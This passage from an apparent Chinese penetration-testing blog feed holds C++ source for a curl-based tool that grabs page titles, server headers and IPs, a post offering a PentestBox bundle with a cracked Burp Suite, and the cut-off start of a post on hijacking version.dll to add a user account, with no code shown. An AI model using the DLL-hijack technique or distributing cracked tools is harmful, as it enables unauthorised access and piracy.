class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CURL_STATICLIB  <span class="comment">//必须在包含curl.h前定义</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;io.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"curl/curl.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctime&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;regex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"libiconv\iconv.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt; </span></span></span><br><span class="line"><span class="comment">//std::string my_str="sssss";</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//my_str.erase(std::remove(my_str.begin(), my_str.end(), '\t'), my_str.end());</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;  </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>::regex_constants;</span><br><span class="line"><span class="comment">//以下四项是必须的</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment ( lib, <span class="meta-string">"libcurl.lib"</span> )</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment (lib, <span class="meta-string">"libiconv.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment ( lib, <span class="meta-string">"ws2_32.lib"</span> )</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment ( lib, <span class="meta-string">"winmm.lib"</span> )</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment ( lib, <span class="meta-string">"wldap32.lib"</span> )</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">writer</span><span class="params">(<span class="keyword">char</span> *, <span class="keyword">size_t</span>, <span class="keyword">size_t</span>, <span class="built_in">string</span> *)</span></span>;</span><br><span class="line"><span class="comment">//string HostToIp(const std::string&amp; host);</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">init</span><span class="params">(CURL *&amp;, <span class="keyword">char</span> *,<span class="built_in">string</span> *,<span class="built_in">string</span> *)</span></span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!</span></span><br><span class="line"><span class="comment">https://github.com/svenyao/libiconv/blob/master/docs/libiconv.example.test.txt</span></span><br><span class="line"><span class="comment">对字符串进行语言编码转换</span></span><br><span class="line"><span class="comment">param from  原始编码，比如"GB2312",的按照iconv支持的写</span></span><br><span class="line"><span class="comment">param to    转换的目的编码</span></span><br><span class="line"><span class="comment">param save  转换后的数据保存到这个指针里，需要在外部分配内存</span></span><br><span class="line"><span class="comment">param savelen  存储转换后数据的内存大小</span></span><br><span class="line"><span class="comment">param src      原始需要转换的字符串</span></span><br><span class="line"><span class="comment">param srclen   原始字符串长度</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">convert</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *from, <span class="keyword">const</span> <span class="keyword">char</span> *to, <span class="keyword">char</span>* save, <span class="keyword">int</span> savelen, <span class="keyword">const</span> <span class="keyword">char</span> *src, <span class="keyword">int</span> srclen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">iconv_t</span> cd;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>   *inbuf = src;</span><br><span class="line">    <span class="keyword">char</span> *outbuf = save;</span><br><span class="line">    <span class="keyword">size_t</span> outbufsize = savelen;</span><br><span class="line">    <span class="keyword">int</span> status = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span>  savesize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> inbufsize = srclen;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* inptr = inbuf;</span><br><span class="line">    <span class="keyword">size_t</span>      insize = inbufsize;</span><br><span class="line">    <span class="keyword">char</span>* outptr = outbuf;</span><br><span class="line">    <span class="keyword">size_t</span> outsize = outbufsize;</span><br><span class="line">    </span><br><span class="line">    cd = iconv_open(to, from);</span><br><span class="line">    iconv(cd, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (inbufsize == <span class="number">0</span>) &#123;</span><br><span class="line">        status = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (insize &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">size_t</span> res = iconv(cd, (<span class="keyword">const</span> <span class="keyword">char</span>**)&amp;inptr, &amp;insize, &amp;outptr, &amp;outsize);</span><br><span class="line">        <span class="keyword">if</span> (outptr != outbuf) &#123;</span><br><span class="line">            <span class="keyword">int</span> saved_errno = errno;</span><br><span class="line">            <span class="keyword">int</span> outsize = outptr - outbuf;</span><br><span class="line">            <span class="built_in">strncpy</span>(save+savesize, outbuf, outsize);</span><br><span class="line">            errno = saved_errno;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (res == (<span class="keyword">size_t</span>)(<span class="number">-1</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (errno == EILSEQ) &#123;</span><br><span class="line">                <span class="keyword">int</span> one = <span class="number">1</span>;</span><br><span class="line">                iconvctl(cd, ICONV_SET_DISCARD_ILSEQ,&amp;one);</span><br><span class="line">                status = <span class="number">-3</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (errno == EINVAL) &#123;</span><br><span class="line">                <span class="keyword">if</span> (inbufsize == <span class="number">0</span>) &#123;</span><br><span class="line">                    status = <span class="number">-4</span>;</span><br><span class="line">                    <span class="keyword">goto</span> done;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (errno == E2BIG) &#123;</span><br><span class="line">                status = <span class="number">-5</span>;</span><br><span class="line">                <span class="keyword">goto</span> done;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                status = <span class="number">-6</span>;</span><br><span class="line">                <span class="keyword">goto</span> done;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    status = <span class="built_in">strlen</span>(save);</span><br><span class="line">done:</span><br><span class="line">    iconv_close(cd);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  convert(...) string封装</span></span><br><span class="line"><span class="comment"> *  [in|out]put string : src_str</span></span><br><span class="line"><span class="comment"> *  s[from|to]: 编码名称</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">convert_str</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; sfrom, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; sto, <span class="built_in">std</span>::<span class="built_in">string</span>&amp; src_str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ilen = src_str.length();</span><br><span class="line"><span class="keyword">int</span> ioutlen = ilen * <span class="number">3</span>;</span><br><span class="line"><span class="keyword">char</span> *outbuf = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(ioutlen);</span><br><span class="line"><span class="built_in">memset</span>(outbuf, <span class="number">0</span>, ioutlen);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> nret = convert(sfrom.c_str(), sto.c_str(), outbuf, ioutlen, src_str.c_str(), ilen);</span><br><span class="line"><span class="keyword">if</span> (nret &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">free</span>(outbuf);</span><br><span class="line">outbuf = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> nret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">outbuf[nret] = <span class="string">'\0'</span>;</span><br><span class="line">src_str = outbuf;</span><br><span class="line"><span class="built_in">free</span>(outbuf);</span><br><span class="line">outbuf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> nret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Usage</span><span class="params">(<span class="keyword">char</span>* prog)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]:%s Usage-&gt; http://www.360.net \r\n"</span>,prog);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]:code by: lostwolf \r\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CURL *conn = <span class="literal">NULL</span>;</span><br><span class="line">    CURLcode code;</span><br><span class="line"><span class="built_in">string</span> buffer;</span><br><span class="line"><span class="built_in">string</span> h_buffer;</span><br><span class="line"><span class="built_in">string</span> XPowered;</span><br><span class="line"><span class="built_in">string</span> content;</span><br><span class="line"><span class="built_in">string</span> charset;</span><br><span class="line"><span class="keyword">char</span>  *ip;</span><br><span class="line"><span class="keyword">long</span> response_code;</span><br><span class="line"><span class="built_in">string</span> title;</span><br><span class="line"><span class="built_in">string</span> header;</span><br><span class="line"><span class="built_in">string</span>  server;</span><br><span class="line">   <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Usage(argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//lstrcpyW(tp.Host,argv[1]);</span></span><br><span class="line">    curl_global_init(CURL_GLOBAL_DEFAULT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* url=argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">   init(conn,url,&amp;buffer,&amp;h_buffer);</span><br><span class="line">    code = curl_easy_perform(conn);</span><br><span class="line"></span><br><span class="line">content=buffer.c_str();</span><br><span class="line">header=h_buffer.c_str();</span><br><span class="line">   <span class="function">regex <span class="title">re_title</span><span class="params">(<span class="string">"&lt;title&gt;([^&lt;]+)&lt;/title&gt;"</span>)</span></span>;</span><br><span class="line">   <span class="function">regex <span class="title">re_charset</span><span class="params">(<span class="string">"content=\".*charset=(.*?)\""</span>)</span></span>; </span><br><span class="line">   <span class="function">regex <span class="title">re_server</span><span class="params">(<span class="string">"Server:\\s(.*?)\\r"</span>)</span></span>;</span><br><span class="line">   <span class="function">regex <span class="title">re_XPowered</span><span class="params">(<span class="string">"X-Powered-By:\\s(.*?)\\r"</span>)</span></span>;</span><br><span class="line">   smatch match_XPowered;</span><br><span class="line">   smatch match_charset;</span><br><span class="line">   smatch match_title;</span><br><span class="line">   smatch match_server;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> ( regex_search(content, match_charset, re_charset) ) &#123;</span><br><span class="line">charset=match_charset[<span class="number">1</span>].str();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">charset=<span class="string">"utf-8"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( regex_search(content, match_title, re_title) ) &#123;</span><br><span class="line">title=match_title[<span class="number">1</span>].str();</span><br><span class="line">convert_str(charset, <span class="string">"gb2312"</span>, title);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">if</span> ( regex_search(header, match_server, re_server) ) &#123;</span><br><span class="line">server=match_server[<span class="number">1</span>].str();</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">if</span> ( regex_search(header, match_XPowered, re_XPowered) ) &#123;</span><br><span class="line">XPowered=match_server[<span class="number">1</span>].str();</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">if</span>(server==XPowered)&#123;</span><br><span class="line">XPowered=<span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((code == CURLE_OK) &amp;&amp;</span><br><span class="line">     !curl_easy_getinfo(conn, CURLINFO_PRIMARY_IP, &amp;ip) &amp;&amp; ip) &#123;</span><br><span class="line"> curl_easy_getinfo(conn, CURLINFO_RESPONSE_CODE, &amp;response_code);</span><br><span class="line"> <span class="built_in">cout</span> &lt;&lt;<span class="string">"Target-&gt;["</span>&lt;&lt;url&lt;&lt;<span class="string">']'</span>&lt;&lt;<span class="string">' '</span>; </span><br><span class="line"> <span class="built_in">cout</span> &lt;&lt;<span class="string">"Code-&gt;["</span>&lt;&lt;response_code&lt;&lt;<span class="string">']'</span>&lt;&lt;<span class="string">' '</span>; </span><br><span class="line"><span class="built_in">cout</span> &lt;&lt;<span class="string">"IP-&gt;["</span>&lt;&lt;ip&lt;&lt;<span class="string">']'</span>&lt;&lt;<span class="string">' '</span>; </span><br><span class="line"><span class="built_in">cout</span> &lt;&lt;<span class="string">"Server-&gt;["</span>&lt;&lt;server&lt;&lt;<span class="string">']'</span>&lt;&lt;<span class="string">' '</span>; </span><br><span class="line"><span class="built_in">cout</span> &lt;&lt;XPowered&lt;&lt;<span class="string">' '</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt;<span class="string">"Title-&gt;["</span>&lt;&lt;title&lt;&lt;<span class="string">']'</span>&lt;&lt;<span class="string">' '</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">curl_easy_cleanup(conn);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt;<span class="string">"[!] "</span>&lt;&lt;url&lt;&lt;<span class="string">" connect failed!"</span>&lt;&lt;<span class="string">' '</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">'\n'</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">init</span><span class="params">(CURL *&amp;conn, <span class="keyword">char</span> *url,<span class="built_in">string</span> *p_buffer,<span class="built_in">string</span> *h_buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CURLcode code;</span><br><span class="line">conn = curl_easy_init();</span><br><span class="line">    code = curl_easy_setopt(conn, CURLOPT_URL, url);</span><br><span class="line"><span class="comment">//code = curl_easy_setopt(conn, CURLOPT_VERBOSE, 1L);  //详细</span></span><br><span class="line">    code = curl_easy_setopt(conn, CURLOPT_TIMEOUT, <span class="number">3</span>);</span><br><span class="line">    code = curl_easy_setopt(conn, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">curl_easy_setopt(conn, CURLOPT_USERAGENT, <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"</span>);</span><br><span class="line">    code = curl_easy_setopt(conn, CURLOPT_WRITEFUNCTION, writer);</span><br><span class="line">code = curl_easy_setopt(conn, CURLOPT_HEADERDATA, h_buffer);</span><br><span class="line">    code = curl_easy_setopt(conn, CURLOPT_WRITEDATA, p_buffer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">writer</span><span class="params">(<span class="keyword">char</span> *data, <span class="keyword">size_t</span> size, <span class="keyword">size_t</span> nmemb, <span class="built_in">string</span> *writerData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> sizes = size * nmemb;</span><br><span class="line">    <span class="keyword">if</span> (writerData == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    writerData-&gt;append(data, sizes);</span><br><span class="line">    <span class="keyword">return</span> sizes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下载:<br><a href="https://wolvez.oss-cn-hangzhou.aliyuncs.com/files%2Fhtml.zip" target="_blank" rel="noopener">hinfo.exe</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> http </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新版pentestbox支持win10</title>
      <link href="/2018/03/11/pentestbox/"/>
      <url>/2018/03/11/pentestbox/</url>
      
        <content type="html"><![CDATA[<ul><li>以完美支持windows 10</li><li>以更新至 metasploit 5</li><li>增加了 searchsploit</li><li>增加 mycli</li><li>burp 使用新版 以破解版</li><li>壳改为了cmder</li><li>table 补全更好用了</li><li><strong>metasploit</strong> 自动连接到 pgsql</li><li><strong>pgsql</strong> 随msf 启动而启动 随msf关闭而关闭</li><li>其它自己挖掘<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/71a70bba9d9704cb59346c670ac18c19.png" alt="2019-07-19-17-44-05"><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/2c837d5955b1eea3cf2639fb6dd4680d.png" alt="2019-07-19-17-44-24"></li></ul><p><strong>已知bug:</strong><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/cab5b9f72441e44db407f2b821e57cff.png" alt="2019-07-19-17-44-43"></p><p><strong>解决办法：</strong></p><p>下载<a href="https://github.com/cmderdev/cmder/issues/501" target="_blank" rel="noopener">advapi32.dll</a>丢进当前目录<br><strong>下载链接：</strong><br><a href="https://pan.baidu.com/s/121mTWu32228OeMHSIn1I7A" target="_blank" rel="noopener">pentestbox 提取码: h73i</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>劫持version.dll 添加用户</title>
      <link href="/2017/07/24/Fake-dll/"/>
      <url>/2017/07/24/Fake-dll/</url>
      
        <content type="html"><![CDATA[<p>核心代码由<a href="https://github.com/Yonsm/AheadLib" target="_blank" rel="noopener">AheadLib工具生成</a>,很多软件存在version.dll 劫持问题。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span 